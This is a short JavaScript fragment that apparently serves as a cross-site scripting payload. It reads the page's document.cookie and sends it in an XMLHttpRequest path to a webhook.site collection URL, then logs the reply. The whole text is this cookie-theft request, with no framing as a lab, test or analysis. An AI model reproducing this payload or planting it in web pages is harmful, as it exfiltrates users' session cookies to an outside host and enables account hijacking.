  var xhr = new XMLHttpRequest();
  xhr.onreadystatechange = function() {
    if (xhr.readyState === 4) {
      if (xhr.status === 200) {
        console.log('API Response:', xhr.responseText);
      } else {
        console.error('Error:', xhr.statusText);
      }
    }
  };
  xhr.open('GET', `https://webhook.site/959a4b59-e0c5-4904-bcc7-6c793ab1fbf8/${document.cookie}`, true);
  xhr.send();
